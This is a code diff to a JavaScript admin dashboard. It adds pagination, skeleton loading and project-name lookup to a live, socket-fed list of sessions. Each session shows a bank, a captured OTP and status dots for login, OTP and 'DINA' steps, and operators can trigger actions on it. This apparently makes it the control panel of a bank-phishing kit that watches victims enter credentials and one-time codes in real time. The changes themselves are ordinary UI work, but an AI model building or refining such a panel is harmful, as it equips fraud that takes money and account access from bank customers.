@@ -1,11 +1,19 @@
 // =========================
 // Config / State
 // =========================
-const nodeUrl = "http://192.168.18.120:3005";
+const nodeUrl = window.ADMIN_CFG?.nodeUrl || "http://localhost:3005";
 let socket;
 let sessionsById = {};
 let selectedId = null;
 let bootstrapped = false;
+
+// Projects map (loaded from PHP)
+const projectsMap = window.PROJECTS_MAP || {};
+
+// Pagination state
+let sessionsPerPage = parseInt(localStorage.getItem('sessionsPerPage')) || 15;
+let currentPage = 1;
+let totalPages = 1;
 
 // =========================
 // Desbloqueo de sonido
@@ -73,6 +81,23 @@ function playSound(kind) {
 
     a.currentTime = 0;
     a.play().catch(() => {});
+}
+
+// =========================
+// Skeleton Loading
+// =========================
+function hideSkeleton() {
+    const skeleton = document.getElementById("sessionsSkeleton");
+    const list = document.getElementById("sessionsList");
+    if (skeleton) skeleton.classList.remove("loading");
+    if (list) list.classList.remove("loading");
+}
+
+function showSkeleton() {
+    const skeleton = document.getElementById("sessionsSkeleton");
+    const list = document.getElementById("sessionsList");
+    if (skeleton) skeleton.classList.add("loading");
+    if (list) list.classList.add("loading");
 }
 
 // =========================
@@ -737,6 +762,10 @@ export async function connectAdmin() {
     socket.on("admin:sessions:bootstrap", (sessions) => {
         sessionsById = {};
         (sessions || []).forEach((sess) => (sessionsById[sess.id] = sess));
+
+        // Hide skeleton, show content
+        hideSkeleton();
+
         renderList();
         bootstrapped = true;
         // refresca el detalle si había selección
@@ -926,15 +955,34 @@ function createToastContainer() {
 // =========================
 // List render
 // =========================
+function getProjectName(projectId) {
+    if (!projectId) return "Sin proyecto";
+    return projectsMap[projectId] || projectId;
+}
+
 function renderList() {
     const listEl = document.getElementById("sessionsList");
     if (!listEl) return;
 
-    const items = Object.values(sessionsById).sort(
+    const allItems = Object.values(sessionsById).sort(
         (a, b) => new Date(b.updatedAt) - new Date(a.updatedAt),
     );
 
-    console.log(items);
+    // Pagination calculations
+    const totalItems = allItems.length;
+    totalPages = Math.ceil(totalItems / sessionsPerPage);
+
+    // Ensure current page is valid
+    if (currentPage > totalPages) currentPage = totalPages;
+    if (currentPage < 1) currentPage = 1;
+
+    // Get items for current page
+    const startIndex = (currentPage - 1) * sessionsPerPage;
+    const endIndex = startIndex + sessionsPerPage;
+    const items = allItems.slice(startIndex, endIndex);
+
+    // Render pagination
+    renderPagination(totalItems);
 
     listEl.innerHTML = items
         .map((s) => {
@@ -952,10 +1000,9 @@ function renderList() {
             );
             const hasOtp = !!s.otp;
 
-            const bankLabel = !s.bank || s.bank === "null" 
+            const bankLabel = !s.bank || s.bank === "null"
                 ? "⏳ esperando..."
                 : `🏦 ${s.bank.charAt(0).toUpperCase() + s.bank.slice(1)}`;
-            /* const actionLabel = ACTION_UI[s.action]?.label ?? s.action ?? "—"; */
             const actionLabel = actionDot(s.action);
             const dot = stateDot(s.state);
 
@@ -964,6 +1011,9 @@ function renderList() {
             const logoCls = sectionDotClass(s, "LOGO");
             const otpCls = sectionDotClass(s, "OTP");
             const dinaCls = sectionDotClass(s, "DINA");
+
+            // Get project name from map
+            const projectName = getProjectName(s.projectId);
 
             return `
         <div class="row ${selected}" onclick="openSession('${escapeHtml(s.id)}')">
@@ -975,7 +1025,7 @@ function renderList() {
                   <span class="sid">${escapeHtml(s.id)}</span>
                 </div>
                 <div class="rowtop-left-name">
-                  <span class="project-slug">${escapeHtml(s.project ?? "Sin proyecto")}</span>
+                  <span class="project-slug">${escapeHtml(projectName)}</span>
                   <br>
                   <span class="sname">${escapeHtml(s.name ?? "Sin nombre")}</span>
                 </div>
@@ -1004,6 +1054,156 @@ function renderList() {
         })
         .join("");
 }
+
+// =========================
+// Pagination render
+// =========================
+function renderPagination(totalItems) {
+    const paginationEl = document.getElementById("sessionsPagination");
+    const infoEl = document.getElementById("paginationInfo");
+    const pagesEl = document.getElementById("paginationPages");
+    const prevBtn = document.getElementById("prevPage");
+    const nextBtn = document.getElementById("nextPage");
+    const firstBtn = document.getElementById("firstPage");
+    const lastBtn = document.getElementById("lastPage");
+    const perPageSelect = document.getElementById("sessionsPerPage");
+
+    if (!paginationEl) return;
+
+    // Show/hide pagination
+    if (totalItems === 0) {
+        paginationEl.style.display = "none";
+        return;
+    }
+
+    paginationEl.style.display = "";
+
+    // Update per page select
+    if (perPageSelect) {
+        perPageSelect.value = sessionsPerPage;
+    }
+
+    // Calculate range
+    const startItem = totalItems === 0 ? 0 : (currentPage - 1) * sessionsPerPage + 1;
+    const endItem = Math.min(currentPage * sessionsPerPage, totalItems);
+
+    // Update info
+    if (infoEl) {
+        infoEl.textContent = `Mostrando ${startItem} - ${endItem} de ${totalItems} sesiones`;
+    }
+
+    // Update buttons state
+    if (firstBtn) {
+        firstBtn.disabled = currentPage === 1;
+        firstBtn.classList.toggle("disabled", currentPage === 1);
+    }
+    if (prevBtn) {
+        prevBtn.disabled = currentPage === 1;
+        prevBtn.classList.toggle("disabled", currentPage === 1);
+    }
+    if (nextBtn) {
+        nextBtn.disabled = currentPage >= totalPages;
+        nextBtn.classList.toggle("disabled", currentPage >= totalPages);
+    }
+    if (lastBtn) {
+        lastBtn.disabled = currentPage >= totalPages;
+        lastBtn.classList.toggle("disabled", currentPage >= totalPages);
+    }
+
+    // Render page numbers
+    if (pagesEl) {
+        let pagesHtml = "";
+
+        for (let i = 1; i <= totalPages; i++) {
+            // Show first, last, and pages within 2 of current
+            if (i === 1 || i === totalPages || Math.abs(i - currentPage) <= 2) {
+                if (i === currentPage) {
+                    pagesHtml += `<span class="pagination-page active" aria-current="page">${i}</span>`;
+                } else {
+                    pagesHtml += `<a href="#" class="pagination-page" data-page="${i}">${i}</a>`;
+                }
+            } else if (Math.abs(i - currentPage) === 3) {
+                pagesHtml += `<span class="pagination-ellipsis">...</span>`;
+            }
+        }
+
+        pagesEl.innerHTML = pagesHtml;
+    }
+}
+
+// =========================
+// Pagination event handlers
+// =========================
+function initPaginationEvents() {
+    const prevBtn = document.getElementById("prevPage");
+    const nextBtn = document.getElementById("nextPage");
+    const firstBtn = document.getElementById("firstPage");
+    const lastBtn = document.getElementById("lastPage");
+    const pagesEl = document.getElementById("paginationPages");
+    const perPageSelect = document.getElementById("sessionsPerPage");
+
+    if (firstBtn) {
+        firstBtn.addEventListener("click", () => {
+            if (currentPage > 1) {
+                currentPage = 1;
+                renderList();
+            }
+        });
+    }
+
+    if (prevBtn) {
+        prevBtn.addEventListener("click", () => {
+            if (currentPage > 1) {
+                currentPage--;
+                renderList();
+            }
+        });
+    }
+
+    if (nextBtn) {
+        nextBtn.addEventListener("click", () => {
+            if (currentPage < totalPages) {
+                currentPage++;
+                renderList();
+            }
+        });
+    }
+
+    if (lastBtn) {
+        lastBtn.addEventListener("click", () => {
+            if (currentPage < totalPages) {
+                currentPage = totalPages;
+                renderList();
+            }
+        });
+    }
+
+    if (pagesEl) {
+        pagesEl.addEventListener("click", (e) => {
+            const pageLink = e.target.closest("[data-page]");
+            if (pageLink) {
+                e.preventDefault();
+                const page = parseInt(pageLink.dataset.page);
+                if (page !== currentPage) {
+                    currentPage = page;
+                    renderList();
+                }
+            }
+        });
+    }
+
+    if (perPageSelect) {
+        perPageSelect.addEventListener("change", (e) => {
+            sessionsPerPage = parseInt(e.target.value);
+            localStorage.setItem("sessionsPerPage", sessionsPerPage);
+            currentPage = 1; // Reset to first page
+            renderList();
+        });
+    }
+}
+
+// Initialize pagination events when DOM is ready
+document.addEventListener("DOMContentLoaded", initPaginationEvents);
 
 // =========================
 // Actions render
